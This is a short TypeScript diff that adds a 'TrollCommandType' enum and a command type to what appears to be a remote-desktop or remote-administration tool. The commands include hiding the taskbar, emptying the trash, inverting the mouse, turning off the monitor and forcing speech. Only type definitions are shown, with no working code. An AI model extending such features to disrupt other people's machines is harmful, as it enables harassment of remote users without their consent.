@@ -154,3 +154,28 @@ export interface RemoteDesktopFramePayload {
   display: number;
   data: string;
 }
+
+export enum TrollCommandType {
+  HideDesktop = "HideDesktop",
+  ShowDesktop = "ShowDesktop",
+  HideTaskbar = "HideTaskbar",
+  ShowTaskbar = "ShowTaskbar",
+  HideNotify = "HideNotify",
+  ShowNotify = "ShowNotify",
+  FocusDesktop = "FocusDesktop",
+  EmptyTrash = "EmptyTrash",
+  RevertMouse = "RevertMouse",
+  NormalMouse = "NormalMouse",
+  MonitorOff = "MonitorOff",
+  MonitorOn = "MonitorOn",
+  MaxVolume = "MaxVolume",
+  MinVolume = "MinVolume",
+  MuteVolume = "MuteVolume",
+  UnmuteVolume = "UnmuteVolume",
+  SpeakText = "SpeakText",
+}
+
+export type TrollCommand = {
+  type: TrollCommandType;
+  payload?: any;
+};
